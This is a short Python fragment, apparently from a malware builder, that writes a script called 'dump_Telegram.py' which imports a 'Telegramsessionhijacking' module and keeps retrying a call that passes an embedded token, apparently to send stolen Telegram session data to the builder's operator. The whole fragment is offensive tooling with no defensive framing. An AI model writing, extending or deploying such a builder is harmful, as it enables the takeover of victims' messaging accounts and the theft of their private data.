def build_t(token):
	with open("dump_Telegram.py","w+") as file:
		file.write("from modules_version2.Telegramsessionhijacking import TER\n")
		file.write("from time import sleep\n")
		file.write("TR = TER()")
		file.write("""
def run():
	while 1:
		try:
			TT = TER()
			""")
		file.write("TT.telegramm("+"'"+token+"'"+")")
		file.write("""
			break
		except Exception:
			sleep(120)
			""")
		file.write(""" 
run()
	""")
		file.close()

